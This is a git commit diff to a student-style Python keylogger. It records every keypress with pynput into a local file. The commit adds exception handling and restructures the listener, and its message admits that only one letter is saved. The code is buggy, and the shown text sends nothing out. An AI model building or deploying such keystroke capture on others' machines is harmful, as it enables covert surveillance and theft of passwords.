7d359d122cd8d9b528548bcc14524001ac541f5f
chj8702 <chj8702@rit.edu>
2019-04-11 12:11:40 -0400

    Added exception catches. File open/close works, but one letter only

--- logger.py
+++ logger.py
@@ -3,18 +3,17 @@ Python Keylogger
 By Connor Jackson
 """
 from pynput import keyboard
-from threading import Thread
-import exporter
 
-# file1 = open('record.txt', 'w')
+output_file = "record.txt"
+
 
 def on_press(key):
+    file1 = open(output_file, 'w')
     try:
-        # print('Alpha Key ' + key.char + ' pressed')
         print(key)
         file1.write(key.char)
+        file1.close()
     except AttributeError:
-        # print('Special key ' + key.char + ' pressed')
         print(key)
         if key == keyboard.Key.enter:
             file1.write('\n')
@@ -23,25 +22,35 @@ def on_press(key):
         elif key == keyboard.Key.space:
             file1.write(' ')
         elif key == keyboard.Key.backspace:
-            file1.seek(-1)
-            file1.truncate()
+            try:
+                file1.seek(-1)
+                file1.truncate()
+            except ValueError:
+                # This happens if the first key pressed is backspace (on an empty file)
+                pass
         elif key == keyboard.Key.alt or keyboard.Key.alt_gr or keyboard.Key.alt_l or keyboard.Key.alt_r:
             file1.write(' (alt) ')
         if key == keyboard.Key.esc:
             file1.write(' (esc) ')
-        elif key == keyboard.Key.cmd:
+        elif key == keyboard.Key.scroll_lock:
             # End key for debug purposes
             file1.close()
             return False
+    finally:
+        file1.close()
+
 
 def on_release(key):
     pass
 
 
-global file1
-file1 = open('record.txt', 'w')
-with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
-    listener.join()
+def listen():
+    # global file1
+    with keyboard.Listener(
+            on_press=on_press,
+            on_release=on_release) as listener:
+        listener.join()
 
+
+if __name__ == "__main__":
+    listen()
